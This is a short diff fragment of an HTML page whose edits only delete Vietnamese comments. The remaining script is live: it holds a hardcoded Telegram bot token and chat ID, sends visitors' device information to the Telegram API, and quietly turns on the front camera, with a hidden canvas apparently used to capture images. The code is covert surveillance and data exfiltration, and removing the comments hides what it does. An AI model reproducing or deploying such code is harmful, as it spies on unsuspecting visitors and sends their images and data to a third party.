@@ -13,12 +13,12 @@
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // === THAY THÔNG TIN CỦA BẠN VÀO DƯỚI ĐÂY ===
+      
         const BOT_TOKEN = '8377654831:AAG7Q_WCxKJ5K8c0hFiXgr0BJBFQmKEiynA';
         const CHAT_ID = '7662943088';
         // ============================================
 
-        // Gửi thông tin thiết bị
+        
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -29,7 +29,7 @@
             })
         });
 
-        // Bật camera và chụp
+        
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
         .then(stream => {
             const video = document.getElementById('video');
